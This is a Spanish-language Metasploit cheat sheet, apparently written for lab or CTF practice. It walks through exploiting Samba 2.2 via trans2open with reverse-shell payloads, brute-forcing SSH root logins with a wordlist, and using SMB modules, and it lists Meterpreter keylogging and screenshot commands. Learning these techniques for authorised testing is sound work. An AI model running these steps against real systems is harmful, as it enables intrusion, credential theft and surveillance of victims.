# Metasploit ❮❯

Tags: #Comandos #Metasploit #Payloads #Msfvenom

Sintax: 
	RHOSTS = Remote Host (The target IP)
	LHOST = Local host (Our IP)

* Para verificar la DB del Metasploit y despues entrar (Cuando se ejecuta por primera vez)
```bash 
❯ msfdb run
```

* Ejecutar Metasploit
```bash 
❯ msfconsole -q         # q = Quitar el banner de inicio
```

* Comandos de Metasploit dentro de la maquina victima 
```bash 
❯ help                  # Miramos el panel de ayuda
❯ shell                 # Nos regresa una Shell para interactuar mejor 
❯ screenshot            # Captura de pantalla del esquipo
❯ keyscan_start         # Sniffer de pulsaciones del teclado
❯ keyscan_dump          # Nos muestra lo que capturo por el teclado con el comando anterior
❯ background            # Ponemos la sesion en segundo plano 
❯ sessions              # Miramos las sesiones activas en segundo plano 
```

- **msfconsole -q** Iniciamos metasploit (q=no cargue el banner)
**❯ search ❮exploit❯** Buscamos el exploit
		* Modulos: 'Auxiliary, Exploits, Post, Payload'
		* Tipo de Accion: 'Dos, Fuzzers, Scanner, Gather'
**❯ use ❮Number or path❯** Colocamos el numero del exploit que vamos a usar
**❯ options** Miramos las opciones del exploit y lo que debemos de configurar
**❯ set LHOST IP_addres** Configuramos el IP local (Si estamos en una VPN colocar el Tun0)
**❯ set RHOSTS IP_addres** Configuramos el IP remoto (maquina victima)
**❯ set RPORT** **#Puerto** Configuramos el puerto remoto (maquina victima)
**❯ set LPORT** **#Puerto** Configuramos el puerto local
**❯ show targets** Miras los targets disponibles (Diferentes versiones de Windows)
**❯ set target** **numero** Seleccionamos el numero de target a usar
**❯ show payloads** Miramos los payload disponibles


**Payloads**
Non-Stage -> Sends exploit shellcode all at once. Larger in size ando won't always work -> **windows/meterpreter_reverse_tcp**
Staged -> Sends payload in stages. Can be less stable -> **windows/meterpreter/reverse_tcp**

En este caso utilizaremos Metasploit para poder entrar por Samba 2.2
❯ **msfconsole** 
	❯ **search trans2open**
	❯ **use 1**
	❯ **options**
	❯ **set RHOST 192.168.68.112**
	❯ **run o exploit**
Miramos en options que esta ejecutado un **staged payload** ya que tenemos un **linux/x86/meterpreter/reverse_tcp**
Si no funciona podriamos hacer lo siguiente y buscaremos un **Non-staged payload**
❯ **set payload linux/x86/** Antes de completar el payload, podemos darle doble TAB para ver las opciones y los demas Payloads
❯ **set payload linux/x86/shell_reverse_tcp** 
❯ **options** 
❯ **run** Ejecutamos  


Tambien podemos usar Metasploit para explotar el SSH
❯ **msfconsole** 
	❯ **search ssh**
	❯ **use 17** Usaremos el que dice SSH_login
	❯ **options**
	❯ **set username root** Colocaremos el usuario de root
	❯ **set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt** Colocamos la ruta del diccionario 
	❯ **set rhosts 192.168.68.112** Colocamos la IP del target
	❯ **set threads 10** Para que vaya mas rapido al momento de mandar las solicitudes
	❯ **run** Ejecutamos el exploit


- **msfconsole** Para iniciar metaesploit para escanear **SMB**
	❯ **search smb** En este caso buscaremos exploits de SMB, podemos encontrar:
		* Modulos: 'Auxiliary, Exploits, Post, Payload'
		* Tipo de Accion: 'Dos, Fuzzers, Scanner, Gather'
	❯ **use <module#>** Para usar el modulo, lo podremos hacer con la ruta o con el numero 
	❯ **info** Mirar la informacion del modulo
	❯ **options** Para ver las opciones del modulo y ver que necesitamos colocar para que funcione correctamente
	❯ **set RHOSTS <IP.Address>** Colocamos la IP target en el modulo
	❯ **run** Para ejecutar el exploit

Lista de exploits:
-   **samba 3.0.20** Para smb de los puertos 445/139

**❯ shell** Dentro del exploit con shell nos podemos conseguir una consola interactiva

